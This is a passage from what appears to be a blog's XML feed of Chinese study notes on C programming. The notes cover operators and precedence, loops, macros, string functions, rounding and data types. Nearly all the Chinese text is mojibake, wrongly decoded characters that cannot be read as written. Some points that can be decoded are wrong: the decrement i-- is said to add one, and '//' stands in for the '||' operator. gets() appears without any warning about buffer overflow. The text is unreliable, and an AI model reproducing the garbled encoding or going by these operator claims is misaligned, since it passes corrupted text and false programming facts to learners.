å–æœ€å³å€¼</p><p>å…«Â·æ±‚å­—èŠ‚è¿ç®—ç¬¦ä¸Žæ±‚å­—èŠ‚è¡¨è¾¾å¼</p><p>sizeofï¼ˆç±»åž‹å|å˜é‡åï¼‰ å•ç›®</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>cè¯­è¨€ï¼šè¿ç®—ç¬¦å’Œè¡¨è¾¾å¼ï¼ˆ1ï¼‰</title>
      <link href="2021/07/16/c-yu-yan-yun-suan-fu-he-biao-da-shi-1/"/>
      <url>2021/07/16/c-yu-yan-yun-suan-fu-he-biao-da-shi-1/</url>
      
        <content type="html"><![CDATA[<p>ä¸€Â·ç®—æœ¯è¿ç®—ç¬¦</p><p>â€‹    1.è‡ªå¢žå’Œè‡ªå‡è¿ç®—ç¬¦ï¼ˆè‡ªå·¦å‘å³ï¼‰</p><p>â€‹     ++i åœ¨ä½¿ç”¨å˜é‡ä¹‹å‰ å…ˆä½¿içš„å€¼åŠ ä¸€</p><p>â€‹     â€“i   åœ¨ä½¿ç”¨å˜é‡ä¹‹å‰ å…ˆä½¿içš„å€¼å‡ä¸€</p><p>â€‹     ++  ä½¿ç”¨å˜é‡iä¹‹åŽï¼Œä½¿içš„å€¼åŠ ä¸€</p><p>â€‹     iâ€“   ä½¿ç”¨å˜é‡iä¹‹åŽï¼Œä½¿içš„å€¼åŠ ä¸€</p><p>äºŒÂ·èµ‹å€¼è¿ç®—ç¬¦å’Œèµ‹å€¼è¡¨è¾¾å¼</p><p>â€‹    åˆ†ä»¥ç®€å•èµ‹å€¼â€œ=â€ç®—æ•°å¤åˆèµ‹å€¼â€œ*=â€ï¼Œâ€œ+=â€ï¼Œâ€œ-=â€ï¼Œâ€œ/=â€˜â€™ï¼Œâ€%=â€œå’Œä½å¤åˆè¿ç®—èµ‹å€¼â€&gt;&gt;=â€œï¼Œâ€&lt;&lt;=â€œ,â€&amp;=â€ï¼Œâ€œ^=â€ï¼Œâ€œ|=â€ä¸‰ç±»å…±åä¸€ç§ï¼ˆè‡ªå³å‘å·¦ï¼‰</p><p>èµ‹å€¼è¡¨è¾¾å¼</p><p>â€‹    å˜é‡å  èµ‹å€¼è¿ç®—ç¬¦  è¡¨è¾¾å¼</p><p>ä¸‰Â·å…³ç³»è¿ç®—ç¬¦ä¸Žå…³ç³»è¡¨è¾¾å¼</p><p>  ï¼ˆ&gt;,&gt;=,&lt;,&lt;=)  ä¼˜å…ˆçº§è¾ƒé«˜</p><p>  ï¼ˆ==ï¼Œï¼=ï¼‰ä¼˜å…ˆçº§è¾ƒä½Ž</p><p>å…³ç³»è¡¨è¾¾å¼</p><p>â€‹    è¡¨è¾¾å¼1  å…³ç³»è¿ç®—ç¬¦  è¡¨è¾¾å¼2</p><p>å››Â·é€»è¾‘è¿ç®—ç¬¦ä¸Žé€»è¾‘è¡¨è¾¾å¼</p><p>1Â·é€»è¾‘è¿ç®—ç¬¦ï¼ˆè‡ªå·¦å‘å³ï¼‰</p><p>â€‹     ï¼é€»è¾‘éžï¼ˆè‡ªå³å‘å·¦ï¼‰</p><p>â€‹     &amp;&amp; é€»è¾‘ä¸Ž åŒçœŸåˆ™çœŸ</p><p>â€‹     || é€»è¾‘æˆ–  å•çœŸåˆ™çœŸ</p><p>2Â·é€»è¾‘è¿ç®—ç¬¦ä¼˜å…ˆçº§ä»Žé«˜åˆ°ä½Žä¸º</p><p>â€‹    â€œï¼â€ â†’ç®—æœ¯â†’å…³ç³»â†’â€œ&amp;&amp;â€â†’â€œ//â€œâ†’èµ‹å€¼</p><p>3Â·é€»è¾‘è¡¨è¾¾å¼</p><p>â€‹    [è¡¨è¾¾å¼1]  é€»è¾‘è¿ç®—ç¬¦  è¡¨è¾¾å¼2</p><p>â€‹    ä¸€æ—¦èƒ½å¤Ÿç¡®å®šé€»è¾‘è¡¨è¾¾å¼çš„å€¼ï¼Œå°±ç«‹å³ç»“æŸè¿ç®—ï¼Œä¸åœ¨è¿›è¡ŒåŽé¢è¡¨è¾¾å¼çš„è¿ç®—ã€‚é€»è¾‘è¿ç®—çš„ç»“æžœä¸º0æˆ–1ã€‚</p><p>â€‹     â€œ&amp;&amp;â€â€œ//â€œéƒ½å¯¹æ“ä½œæ•°æœ‰â€çŸ­è·¯â€œè®¡ç®—ï¼Œå¯¹äºŽâ€&amp;&amp;â€œåªæœ‰å·¦è¾¹è¡¨è¾¾å¼ä¸ºçœŸï¼Œæ‰è®¡ç®—å³è¾¹è¡¨è¾¾å¼çš„å€¼ï¼Œå¯¹äºŽâ€||â€œåªæœ‰å·¦è¾¹è¡¨è¾¾å¼ä¸ºå‡ï¼Œæ‰è®¡ç®—å³è¾¹è¡¨è¾¾å¼çš„å€¼ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Cè¯­è¨€ï¼šè¿ç®—ç¬¦å’Œç»“åˆæ€§</title>
      <link href="2021/07/16/c-yu-yan-yun-suan-fu-he-jie-he-xing/"/>
      <url>2021/07/16/c-yu-yan-yun-suan-fu-he-jie-he-xing/</url>
      
        <content type="html"><![CDATA[<p>ä¸€ã€ï¼ˆè‡ªå·¦å‘å³ï¼‰</p><p>[ ]æ•°ç»„ä¸‹æ ‡</p><p>ï¼ˆ ï¼‰åœ†æ‹¬å·</p><p>.  æˆå‘˜é€‰æ‹©</p><p>-&gt;  æˆå‘˜é€‰æ‹©</p><p>äºŒã€ï¼ˆè‡ªå·¦å‘å³ï¼Œå•ç›®ï¼‰</p><p>ï¼è´Ÿå·è¿ç®—ç¬¦</p><p>ï¼ˆç±»åž‹ï¼‰å¼ºåˆ¶ç±»åž‹è½¬æ¢</p><p>++è‡ªå¢žè¿ç®—ç¬¦</p><p>ï¼ï¼è‡ªå‡è¿ç®—ç¬¦</p><p>*æŒ‡é’ˆè¿ç®—ç¬¦</p><p>&amp;å–åœ°å€è¿ç®—ç¬¦</p><p>ï¼é€»è¾‘éžè¿ç®—ç¬¦</p><p>~æŒ‰ä½å–åè¿ç®—ç¬¦</p><p>sizeof é•¿åº¦è¿ç®—ç¬¦</p><p>ä¸‰ã€ï¼ˆè‡ªå·¦å‘å³  åŒç›®ï¼‰</p><p>*ä¹˜æ³•è¿ç®—ç¬¦</p><p>/é™¤æ³•è¿ç®—ç¬¦</p><p>%æ±‚ä½™è¿ç®—ç¬¦</p><p>å››ã€è‡ªå·¦å‘å³ åŒç›®</p><p>+ï¼ åŠ å‡è¿ç®—ç¬¦</p><p>äº”ã€è‡ªå·¦å‘å³ åŒç›®</p><p>ã€Šã€‹å·¦å³ç§»è¿ç®—ç¬¦</p><p>å…­ã€è‡ªå·¦å‘å³ åŒç›®</p><p>a&gt;  ,&gt;=,&lt;,&lt;=å…³ç³»è¿ç®—ç¬¦</p><p>ä¸ƒã€è‡ªå·¦å‘å³åŒç›®</p><p>== ï¼=</p><p>å…«ã€è‡ªå·¦å‘å³ åŒç›®</p><p>&amp; æŒ‰ä½ä¸Ž</p><p>ä¹è‡ªå·¦å‘å³ åŒç›®</p><p>^ æŒ‰ä½å¼‚æˆ–</p><p>åè‡ªå·¦å‘å³ åŒç›®</p><p>|æŒ‰ä½æˆ–</p><p>åä¸€ã€è‡ªå·¦å‘å³ åŒç›®</p><p>&amp;&amp; é€»è¾‘ä¸Ž</p><p>åäºŒã€è‡ªå·¦å‘å³ åŒç›®</p><p>||é€»è¾‘æˆ–</p><p>åä¸‰ã€è‡ªå³å‘å·¦ ä¸‰ç›®</p><p>ï¼Ÿï¼šæ¡ä»¶è¿ç®—ç¬¦</p><p>åå››è‡ªå³å‘å·¦ åŒç›®</p><p>èµ‹å€¼è¿ç®—ç¬¦</p><p>åäº”ã€è‡ªå·¦å‘å³</p><p>ï¼Œ é€—å·è¿ç®—ç¬¦</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Cè¯­è¨€ï¼šç¨‹åºçš„æŽ§åˆ¶ç»“æž„</title>
      <link href="2021/07/16/c-yu-yan-cheng-xu-de-kong-zhi-jie-gou/"/>
      <url>2021/07/16/c-yu-yan-cheng-xu-de-kong-zhi-jie-gou/</url>
      
        <content type="html"><![CDATA[<h1 id="å¾ªçŽ¯"><a href="#å¾ªçŽ¯" class="headerlink" title="å¾ªçŽ¯"></a>å¾ªçŽ¯</h1><p>æœ‰çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦å¤šæ¬¡æ‰§è¡ŒåŒä¸€å—ä»£ç ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè¯­å¥æ˜¯æŒ‰é¡ºåºæ‰§è¡Œçš„ï¼šå‡½æ•°ä¸­çš„ç¬¬ä¸€ä¸ªè¯­å¥å…ˆæ‰§è¡Œï¼ŒæŽ¥ç€æ˜¯ç¬¬äºŒä¸ªè¯­å¥ï¼Œä¾æ­¤ç±»æŽ¨ã€‚</p><p>ç¼–ç¨‹è¯­è¨€æä¾›äº†æ›´ä¸ºå¤æ‚æ‰§è¡Œè·¯å¾„çš„å¤šç§æŽ§åˆ¶ç»“æž„ã€‚</p><p>å¾ªçŽ¯è¯­å¥å…è®¸æˆ‘ä»¬å¤šæ¬¡æ‰§è¡Œä¸€ä¸ªè¯­å¥æˆ–è¯­å¥ç»„ï¼Œä¸‹é¢æ˜¯å¤§å¤šæ•°ç¼–ç¨‹è¯­è¨€ä¸­å¾ªçŽ¯è¯­å¥çš„æµç¨‹å›¾ï¼š</p><h2 id="å¾ªçŽ¯ç±»åž‹"><a href="#å¾ªçŽ¯ç±»åž‹" class="headerlink" title="å¾ªçŽ¯ç±»åž‹"></a>å¾ªçŽ¯ç±»åž‹</h2><p>C è¯­è¨€æä¾›äº†ä»¥ä¸‹å‡ ç§å¾ªçŽ¯ç±»åž‹ã€‚ç‚¹å‡»é“¾æŽ¥æŸ¥çœ‹æ¯ä¸ªç±»åž‹çš„ç»†èŠ‚ã€‚</p><table><thead><tr><th align="left">å¾ªçŽ¯ç±»åž‹</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-while-loop.html">while å¾ªçŽ¯</a></td><td align="left">å½“ç»™å®šæ¡ä»¶ä¸ºçœŸæ—¶ï¼Œé‡å¤è¯­å¥æˆ–è¯­å¥ç»„ã€‚å®ƒä¼šåœ¨æ‰§è¡Œå¾ªçŽ¯ä¸»ä½“ä¹‹å‰æµ‹è¯•æ¡ä»¶ã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-for-loop.html">for å¾ªçŽ¯</a></td><td align="left">å¤šæ¬¡æ‰§è¡Œä¸€ä¸ªè¯­å¥åºåˆ—ï¼Œç®€åŒ–ç®¡ç†å¾ªçŽ¯å˜é‡çš„ä»£ç ã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-do-while-loop.html">doâ€¦while å¾ªçŽ¯</a></td><td align="left">é™¤äº†å®ƒæ˜¯åœ¨å¾ªçŽ¯ä¸»ä½“ç»“å°¾æµ‹è¯•æ¡ä»¶å¤–ï¼Œå…¶ä»–ä¸Ž while è¯­å¥ç±»ä¼¼ã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-nested-loops.html">åµŒå¥—å¾ªçŽ¯</a></td><td align="left">æ‚¨å¯ä»¥åœ¨ whileã€for æˆ– do..while å¾ªçŽ¯å†…ä½¿ç”¨ä¸€ä¸ªæˆ–å¤šä¸ªå¾ªçŽ¯ã€‚</td></tr></tbody></table><h2 id="å¾ªçŽ¯æŽ§åˆ¶è¯­å¥"><a href="#å¾ªçŽ¯æŽ§åˆ¶è¯­å¥" class="headerlink" title="å¾ªçŽ¯æŽ§åˆ¶è¯­å¥"></a>å¾ªçŽ¯æŽ§åˆ¶è¯­å¥</h2><p>å¾ªçŽ¯æŽ§åˆ¶è¯­å¥æ”¹å˜ä½ ä»£ç çš„æ‰§è¡Œé¡ºåºã€‚é€šè¿‡å®ƒä½ å¯ä»¥å®žçŽ°ä»£ç çš„è·³è½¬ã€‚</p><p>C æä¾›äº†ä¸‹åˆ—çš„å¾ªçŽ¯æŽ§åˆ¶è¯­å¥ã€‚ç‚¹å‡»é“¾æŽ¥æŸ¥çœ‹æ¯ä¸ªè¯­å¥çš„ç»†èŠ‚ã€‚</p><table><thead><tr><th align="left">æŽ§åˆ¶è¯­å¥</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-break-statement.html">break è¯­å¥</a></td><td align="left">ç»ˆæ­¢<strong>å¾ªçŽ¯</strong>æˆ– <strong>switch</strong> è¯­å¥ï¼Œç¨‹åºæµå°†ç»§ç»­æ‰§è¡Œç´§æŽ¥ç€å¾ªçŽ¯æˆ– switch çš„ä¸‹ä¸€æ¡è¯­å¥ã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-continue-statement.html">continue è¯­å¥</a></td><td align="left">å‘Šè¯‰ä¸€ä¸ªå¾ªçŽ¯ä½“ç«‹åˆ»åœæ­¢æœ¬æ¬¡å¾ªçŽ¯è¿­ä»£ï¼Œé‡æ–°å¼€å§‹ä¸‹æ¬¡å¾ªçŽ¯è¿­ä»£ã€‚</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-goto-statement.html">goto è¯­å¥</a></td><td align="left">å°†æŽ§åˆ¶è½¬ç§»åˆ°è¢«æ ‡è®°çš„è¯­å¥ã€‚ä½†æ˜¯ä¸å»ºè®®åœ¨ç¨‹åºä¸­ä½¿ç”¨ goto è¯­å¥ã€‚</td></tr></tbody></table><h2 id="æ— é™å¾ªçŽ¯"><a href="#æ— é™å¾ªçŽ¯" class="headerlink" title="æ— é™å¾ªçŽ¯"></a>æ— é™å¾ªçŽ¯</h2><p>å¦‚æžœæ¡ä»¶æ°¸è¿œä¸ä¸ºå‡ï¼Œåˆ™å¾ªçŽ¯å°†å˜æˆæ— é™å¾ªçŽ¯ã€‚<strong>for</strong> å¾ªçŽ¯åœ¨ä¼ ç»Ÿæ„ä¹‰ä¸Šå¯ç”¨äºŽå®žçŽ°æ— é™å¾ªçŽ¯ã€‚ç”±äºŽæž„æˆå¾ªçŽ¯çš„ä¸‰ä¸ªè¡¨è¾¾å¼ä¸­ä»»ä½•ä¸€ä¸ªéƒ½ä¸æ˜¯å¿…éœ€çš„ï¼Œæ‚¨å¯ä»¥å°†æŸäº›æ¡ä»¶è¡¨è¾¾å¼ç•™ç©ºæ¥æž„æˆä¸€ä¸ªæ— é™å¾ªçŽ¯ã€‚</p><h2 id="å®žä¾‹"><a href="#å®žä¾‹" class="headerlink" title="å®žä¾‹"></a>å®žä¾‹</h2><p>#include &lt;stdio.h&gt;  int main () {   for( ; ; )   {      printf(â€œè¯¥å¾ªçŽ¯ä¼šæ°¸è¿œæ‰§è¡Œä¸‹åŽ»ï¼\nâ€);   }   return 0; }</p><p>å½“æ¡ä»¶è¡¨è¾¾å¼ä¸å­˜åœ¨æ—¶ï¼Œå®ƒè¢«å‡è®¾ä¸ºçœŸã€‚æ‚¨ä¹Ÿå¯ä»¥è®¾ç½®ä¸€ä¸ªåˆå§‹å€¼å’Œå¢žé‡è¡¨è¾¾å¼ï¼Œä½†æ˜¯ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒC ç¨‹åºå‘˜åå‘äºŽä½¿ç”¨ for(;;) ç»“æž„æ¥è¡¨ç¤ºä¸€ä¸ªæ— é™å¾ªçŽ¯ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Cè¯­è¨€ï¼šå®å®šä¹‰</title>
      <link href="2021/07/16/c-yu-yan-hong-ding-yi/"/>
      <url>2021/07/16/c-yu-yan-hong-ding-yi/</url>
      
        <content type="html"><![CDATA[<p>5.6.1  æ— å‚å®å®šä¹‰</p><p>æ— å‚å®å®šä¹‰å³å®šä¹‰ä¸€ä¸ªæ²¡æœ‰å‚æ•°çš„å®ã€‚</p><p>#define æ ‡è¯†ç¬¦ å­—ç¬¦ä¸²</p><p>5.6.2  å¸¦å‚å®å®šä¹‰</p><p>åœ¨å®å®šä¹‰ä¸­çš„å‚æ•°ç§°ä¸ºå½¢å¼å‚æ•°ï¼Œåœ¨è°ƒç”¨å¸¦å‚å®æ—¶ç»™å‡ºçš„å‚æ•°ç§°ä¸ºå®žé™…å‚æ•°</p><p>#define å®å(å½¢å‚è¡¨) å­—ç¬¦ä¸²</p><p>åœ¨ä½¿ç”¨å¸¦å‚å®å®šä¹‰æ—¶ï¼Œåº”æ³¨æ„ä»¥ä¸‹é—®é¢˜ï¼š</p><p>1.åœ¨å¸¦å‚å®å®šä¹‰ä¸­ï¼Œå®åä¸Žå…¶åŽçš„å·¦æ‹¬å·ä¹‹é—´ä¸åº”åŠ ç©ºæ ¼,å¦åˆ™å°†å˜æˆæ— å‚å®å®šä¹‰</p><p>2.åœ¨å¸¦å‚å®å®šä¹‰ä¸­ï¼Œä¸€èˆ¬åº”å°†å­—ç¬¦ä¸²åŠå­—ç¬¦ä¸²ä¸­çš„å½¢å‚ç”¨åœ†æ‹¬å·æ‹¬èµ·æ¥</p><p>å¸¦å‚å®å®šä¹‰ä¸Žå‡½æ•°çš„ä¸»è¦åŒºåˆ«å¦‚ä¸‹ï¼š</p><p>1.å‡½æ•°è°ƒç”¨æ—¶ï¼Œå…ˆæ±‚å‡ºå®žå‚è¡¨è¾¾å¼çš„å€¼ï¼Œç„¶åŽä»£å…¥å½¢å‚ã€‚è€Œä½¿ç”¨å¸¦å‚æ•°çš„å®åªæ˜¯è¿›è¡Œç®€å•çš„å­—ç¬¦æ›¿æ¢ã€‚</p><p>2.å‡½æ•°è°ƒç”¨æ˜¯åœ¨ç¨‹åºè¿è¡Œæ—¶å¤„ç†çš„ã€‚ä¸ºå½¢å‚åˆ†é…ä¸´æ—¶çš„å†…åœ¨å•å…ƒã€‚è€Œå®å±•å¼€åˆ™æ˜¯åœ¨ç¼–è¯‘å‰è¿›è¡Œçš„ï¼Œåœ¨å±•å¼€æ—¶å¹¶ä¸åˆ†é…å†…å­˜å•å…ƒï¼Œä¸è¿›è¡Œå€¼çš„ä¼ é€’å¤„ç†ï¼Œä¹Ÿæ²¡æœ‰â€œè¿”å›žå€¼â€çš„æ¦‚å¿µã€‚</p><p>3.å¯¹å‡½æ•°ä¸­çš„å®žå‚å’Œå½¢å‚éƒ½è¦å®šä¹‰ç±»åž‹ï¼ŒäºŒè€…çš„å…³åž‹è¦æ±‚ä¸€è‡´ã€‚å¦‚ä¸ä¸€è‡´ï¼Œåº”è¿›è¡Œç±»åž‹è½¬æ¢ã€‚è€Œå®ä¸å­˜åœ¨ç±»åž‹é—®é¢˜ï¼Œå®‰åæ— ç±»åž‹ï¼Œ å®ƒçš„å‚æ•°ä¹Ÿæ— ç±»åž‹ï¼Œåªæ˜¯ä¸€ä¸ªç¬¦å·ä»£è¡¨ï¼Œå±•å¼€æ—¶ä»£å…¥æŒ‡å®šçš„å­—ç¬¦ä¸²å³å¯ã€‚å®å®šä¹‰æ—¶ï¼Œå­—ç¬¦ä¸²å¯ä»¥æ˜¯ä»»ä½•ç±»åž‹çš„æ•°æ®ã€‚</p><p>4.è°ƒç”¨å‡½æ•°åªå¯å¾—åˆ°ä¸€ä¸ªè¿”å›žå€¼ï¼Œè€Œç”¨å®å¯ä»¥è®¾æ³•å¾—åˆ°å‡ ä¸ªç»“æžœã€‚</p><p>5.å®æ›¿æ¢ä¸å è¿è¡Œæ—¶é—´ï¼Œåªå ç¼–è¯‘æ—¶é—´ã€‚è€Œå‡½æ•°è°ƒç”¨åˆ™å è¿è¡Œæ—¶é—´ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Cè¯­è¨€ï¼šå­—ç¬¦ä¸²å¤„ç†å‡½æ•°</title>
      <link href="2021/07/16/c-yu-yan-zi-fu-chuan-chu-li-han-shu/"/>
      <url>2021/07/16/c-yu-yan-zi-fu-chuan-chu-li-han-shu/</url>
      
        <content type="html"><![CDATA[<p>Cè¯­è¨€ ï¼ˆ3ï¼‰å­—ç¬¦ä¸²å¤„ç†å‡½æ•° </p><p>Cè¯­è¨€æä¾›äº†ä¸°å¯Œçš„å­—ç¬¦ä¸²å¤„ç†å‡½æ•°ï¼Œç”¨æ¥å®žçŽ°å¯¹å­—ç¬¦ä¸²çš„è¾“å…¥ã€è¾“å‡ºã€åˆå¹¶ã€ä¿®æ”¹ã€æ¯”è¾ƒã€è½¬æ¢å’Œå¤åˆ¶ç­‰åŠŸèƒ½ã€‚<br>(1)å­—ç¬¦ä¸²è¾“å…¥å‡½æ•°gets()<br>è¯­æ³•æ ¼å¼<br>        gets(å­—ç¬¦æ•°ç»„å)<br>åŠŸèƒ½<br>        ä»Žç»ˆç«¯è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²åˆ°å­—ç¬¦æ•°ç»„ï¼Œå¹¶ä¸”è¿”å›žè¯¥å­—ç¬¦æ•°ç»„çš„èµ·å§‹åœ°å€ã€‚<br>(2)å­—ç¬¦ä¸²è¾“å‡ºå‡½æ•°puts()<br>è¯­æ³•æ ¼å¼<br>        puts (å­—ç¬¦æ•°ç»„å)</p><p>[åŠŸèƒ½]</p><p>â€‹         å°†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œ(ä»¥0ç»“æŸçš„å­—ç¬¦åºåˆ—)è¾“å‡ºåˆ°ç»ˆç«¯ã€‚</p><p>(3)å­—ç¬¦ä¸²è¿žæŽ¥å‡½æ•°strcat()</p><p>[è¯­æ³•æ ¼å¼]</p><p>â€‹        strcat(å­—ç¬¦æ•°ç»„1,å­—ç¬¦æ•°ç»„2)</p><p>[åŠŸèƒ½]</p><p>â€‹         è¿žæŽ¥ä¸¤ä¸ªå­—ç¬¦æ•°ç»„ä¸­çš„å­—ç¬¦ä¸²ï¼ŒæŠŠå­—ç¬¦ä¸²2è¿žæŽ¥åˆ°å­—ç¬¦ä¸²1çš„åŽé¢ï¼ŒæŠŠå¾—åˆ°çš„ç»“æžœæ”¾åœ¨å­—ç¬¦æ•°ç»„1ä¸­ã€‚</p><p>(4)å­—ç¬¦ä¸²å¤åˆ¶å‡½æ•°strcpy() </p><p>[è¯­æ³•æ ¼å¼]</p><p>â€‹         strcpy(å­—ç¬¦æ•°ç»„1,å­—ç¬¦ä¸²2)</p><p>[åŠŸèƒ½]</p><p>â€‹        æŠŠå­—ç¬¦ä¸²2è¿žåŒä¸²ç»“æŸæ ‡å¿—10å¤åˆ¶åˆ°å­—ç¬¦æ•°ç»„1ä¸­ï¼Œå…¶ä¸­å­—ç¬¦ä¸²2å¯ä»¥æ˜¯å­—ç¬¦æ•°ç»„æˆ–å­—ç¬¦ä¸²å¸¸é‡</p><p>(5)å­—ç¬¦ä¸²æ¯”è¾ƒå‡½æ•°strcmp()</p><p>[è¯­æ³•æ ¼å¼]</p><p>â€‹        strcmp(å­—ç¬¦ä¸²1,å­—ç¬¦ä¸²2)</p><p>[åŠŸèƒ½]</p><p>â€‹        å°†å­—ç¬¦ä¸²1å’Œå­—ç¬¦ä¸²2ä¸­çš„ä¸¤ä¸ªå­—ç¬¦ä¸²è‡ªå·¦å‘å³æŒ‰ç…§å„å­—ç¬¦çš„ASCIIç å€¼é€å¯¹è¿›è¡Œæ¯”è¾ƒï¼Œç›´åˆ°å‡ºçŽ°ä¸åŒçš„å­—ç¬¦æˆ–é‡åˆ°N0ä¸ºæ­¢ã€‚å‡½æ•°çš„è¿”å›žå€¼:â‘ è‹¥å­—ç¬¦ä¸²1=å­—ç¬¦ä¸²2,åˆ™è¿”å›žå€¼ä¸º0;â‘¡è‹¥å­—ç¬¦ä¸²1&gt;å­—ç¬¦ä¸²2,åˆ™è¿”å›žå€¼ä¸ºæ­£æ•´æ•°;â‘¢è‹¥å­—ç¬¦ä¸²1&lt;å­—ç¬¦ä¸²2,åˆ™è¿”å›žå€¼ä¸ºè´Ÿæ•´æ•°ã€‚</p><p>(6) æ±‚å­—ç¬¦ä¸²é•¿åº¦å‡½æ•°strlen()</p><p>[è¯­æ³•æ ¼å¼]</p><p>â€‹        strlen(å­—ç¬¦ä¸²)</p><p>[åŠŸèƒ½]</p><p>â€‹        æµ‹è¯•å­—ç¬¦ä¸²é•¿åº¦ï¼Œå³å­—ç¬¦ä¸²ä¸­å­—ç¬¦çš„ä¸ªæ•°ï¼Œä¸åŒ…æ‹¬â€™\0â€™ã€‚</p><p>(7)å¤§å†™å­—æ¯è½¬æ¢ä¸ºå°å†™å­—æ¯å‡½æ•°strlwr()</p><p>[è¯­æ³•æ ¼å¼]</p><p>â€‹        strlwr(å­—ç¬¦ä¸²)</p><p>[åŠŸèƒ½)]</p><p>â€‹        å°†å­—ç¬¦ä¸²ä¸­å¤§å†™å­—æ¯è½¬æ¢æˆå°å†™å­—æ¯ã€‚</p><p>(8)å°å†™å­—æ¯è½¬æ¢ä¸ºå¤§å†™å­—æ¯å‡½æ•°strupr()</p><p>[è¯­æ³•æ ¼å¼]</p><p>â€‹       strupr(å­—ç¬¦ä¸²)</p><p>[åŠŸèƒ½]</p><p>â€‹        å°†å­—ç¬¦ä¸²ä¸­å°å†™å­—æ¯è½¬æ¢æˆå¤§å†™å­—æ¯ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Cè¯­è¨€ï¼šå››èˆäº”å…¥ä¸¤ç§æ–¹æ³•</title>
      <link href="2021/07/16/c-yu-yan-si-she-wu-ru-liang-chong-fang-fa/"/>
      <url>2021/07/16/c-yu-yan-si-she-wu-ru-liang-chong-fang-fa/</url>
      
        <content type="html"><![CDATA[<p>açš„ç¬¬nä½å››èˆäº”å…¥</p><p>ä¸€ã€</p><p>a = (int)(pow(10,n) * a + 0.5) / pow(10,n);</p><p>ä»¥1.23456ä¸ºä¾‹</p><p>a = (intï¼‰(1000.0 * a + 0.5) / 1000.0ï¼›<br>å³å¯ã€‚å¦‚æžœè¦ä¿ç•™å››ä½å°æ•°ï¼Œå°±æŠŠ1000éƒ½æ¢æˆ10000ï¼Œä¾æ¬¡ç±»æŽ¨ã€‚</p><p>äºŒã€</p><p>å…¶å®žï¼Œç”¨Cè¯­è¨€ä¸­çš„printfæŽ§åˆ¶å¥½ç²¾åº¦åŽï¼Œè¦è¾“å‡ºå‡ ä½å°æ•°ï¼Œç„¶åŽè¾“å‡ºå¯ä»¥è‡ªåŠ¨è¿›è¡Œå››èˆäº”å…¥ï¼Œä¸éœ€è¦äººå·¥èˆå…¥äº†ï¼ˆè‹¥ä¸æ˜¯è¦åˆ©ç”¨èˆå…¥åŽçš„ç»“æžœå‚ä¸Žè¿ç®—ï¼Œè€Œæ˜¯å•çº¯åœ°æƒ³æŽ§åˆ¶è¾“å‡ºæ ¼å¼çš„æ—¶å€™ï¼‰ã€‚<br>ä¸‹é¢çš„ä»£ç å¯ä»¥ç®€å•éªŒè¯ï¼š</p><p>#include&lt;stdio.h&gt;</p><p> int main() </p><p>{ </p><p>float a=2.1234567;</p><p> float b=3.016237; </p><p>printf(â€œ%.4f\nâ€,a);    <em>//è¾“å‡ºï¼š2.1235ï¼Œè‡ªåŠ¨è¿›è¡Œäº†å››èˆäº”å…¥ã€‚</em>  </p><p>printf(â€œ%.2f\nâ€,b);    <em>//è¾“å‡ºï¼š3.02ï¼Œè‡ªåŠ¨è¿›è¡Œäº†å››èˆäº”å…¥ã€‚</em> </p><p> printf(â€œ%.3f\nâ€,b);    <em>//è¾“å‡ºï¼š3.016ï¼Œè‡ªåŠ¨è¿›è¡Œäº†å››èˆäº”å…¥ã€‚</em></p><p>  return 0;</p><p> }</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Cè¯­è¨€ï¼šå‡½æ•°æ•°æ®ç±»åž‹</title>
      <link href="2021/07/16/c-yu-yan-han-shu-shu-ju-lei-xing/"/>
      <url>2021/07/16/c-yu-yan-han-shu-shu-ju-lei-xing/</url>
      
        <content type="html"><![CDATA[<h1 id="C-æ•°æ®ç±»åž‹"><a href="#C-æ•°æ®ç±»åž‹" class="headerlink" title="C æ•°æ®ç±»åž‹"></a>C æ•°æ®ç±»åž‹</h1><p>åœ¨ C è¯­è¨€ä¸­ï¼Œæ•°æ®ç±»åž‹æŒ‡çš„æ˜¯ç”¨äºŽå£°æ˜Žä¸åŒç±»åž‹çš„å˜é‡æˆ–å‡½æ•°çš„ä¸€ä¸ªå¹¿æ³›çš„ç³»ç»Ÿã€‚å˜é‡çš„ç±»åž‹å†³å®šäº†å˜é‡å­˜å‚¨å ç”¨çš„ç©ºé—´ï¼Œä»¥åŠå¦‚ä½•è§£é‡Šå­˜å‚¨çš„ä½æ¨¡å¼ã€‚</p><p>C ä¸­çš„ç±»åž‹å¯åˆ†ä¸ºä»¥ä¸‹å‡ ç§ï¼š</p><table><thead><tr><th align="left">åºå·</th><th align="left">ç±»åž‹ä¸Žæè¿°</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>åŸºæœ¬ç±»åž‹ï¼š</strong> å®ƒä»¬æ˜¯ç®—æœ¯ç±»åž‹ï¼ŒåŒ…æ‹¬ä¸¤ç§ç±»åž‹ï¼šæ•´æ•°ç±»åž‹å’Œæµ®ç‚¹ç±»åž‹ã€‚</td></tr><tr><td align="left">2</td><td align="left"><strong>æžšä¸¾ç±»åž‹ï¼š</strong> å®ƒä»¬ä¹Ÿæ˜¯ç®—æœ¯ç±»åž‹ï¼Œè¢«ç”¨æ¥å®šä¹‰åœ¨ç¨‹åºä¸­åªèƒ½èµ‹äºˆå…¶ä¸€å®šçš„ç¦»æ•£æ•´æ•°å€¼çš„å˜é‡ã€‚</td></tr><tr><td align="left">3</td><td align="left"><strong>void 